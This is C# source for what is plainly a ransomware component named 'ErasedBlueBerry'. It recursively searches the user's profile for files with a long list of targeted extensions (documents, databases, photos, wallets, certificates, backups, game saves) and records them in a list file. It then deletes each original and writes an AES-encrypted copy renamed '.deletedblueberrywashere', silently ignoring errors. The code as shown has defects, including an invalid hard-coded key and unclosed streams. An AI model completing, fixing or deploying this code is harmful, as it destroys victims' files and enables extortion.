using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace ErasedBlueBerry
{
    internal class encryptor
    {
        string basePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string fileListPath = Path.Combine("C:\\", "deletedblueberry.filelist");
        byte[] key = Encoding.UTF8.GetBytes("key");

        public encryptor() 
        {

        }

        private void RecursiveSearch(string basePath, StreamWriter fileListFile)
        {
            string[] targetExtensions = new string[] //list of file extensions that will be targeted.
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".jpeg",
                ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml",
                ".psd", ".mp4", ".7z", ".rar", ".m4a", ".bmp", ".wma", ".avi", ".wmv", ".d3dbsp",
                ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass",
                ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb",
                ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg",
                ".map", ".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid",
                ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip",
                ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh",
                ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta",
                ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das",
                ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav",
                ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", ".wallet", ".wotreplay",
                ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".log",
                ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef",
                ".ptx", ".r3d", ".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef",
                ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr",
                ".dng", ".jpe", ".cdr", ".indd", ".ai", ".eps", ".pdd", ".dbf", ".mdf", ".wb2",
                ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx",
                ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc",
                ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".pdf", ".exe", ".lnk", ".mp3", ".bak"
            };

            try
            {
                foreach (string file in Directory.GetFiles(basePath))
                {
                    string ext = Path.GetExtension(file);

                    if (ext != null && targetExtensions.Contains(ext, StringComparer.OrdinalIgnoreCase))
                    {
                        fileListFile.WriteLine(file);
                    }
                }

                foreach (string directory in Directory.GetDirectories(basePath))
                {
                    RecursiveSearch(directory, fileListFile);
                }
            }
            catch { } 
        }

        private void EncryptFiles(string fileListPath, byte[] key)
        {
            try
            {
                StreamReader sr = new StreamReader(fileListPath);
                while (!sr.EndOfStream) 
                { 
                    string path = sr.ReadLine();
                    EncryptFile(path, key);
                }
            }
            catch { }
        }

        private void EncryptFile(string path, byte[] key)
        {
            try
            {
                Aes aes = Aes.Create();
                aes.Key = key;
                aes.Mode = CipherMode.CBC;
                aes.GenerateIV();

                FileStream infs = new FileStream(path, FileMode.Open);

                byte[] fileBytes;
                fileBytes = new byte[infs.Length];
                infs.Read(fileBytes, 0, fileBytes.Length);

                File.Delete(path);

                string outPath = path + ".deletedblueberrywashere";
                FileStream outfs = new FileStream(outPath, FileMode.Create);
                ICryptoTransform cryptoTransform = aes.CreateEncryptor();
                CryptoStream cryptoStream = new CryptoStream(outfs, cryptoTransform, CryptoStreamMode.Write);

                outfs.Write(aes.IV, 0, aes.IV.Length);
                cryptoStream.Write(fileBytes, 0, fileBytes.Length);
            } catch { }
           
            



        }



    }
}
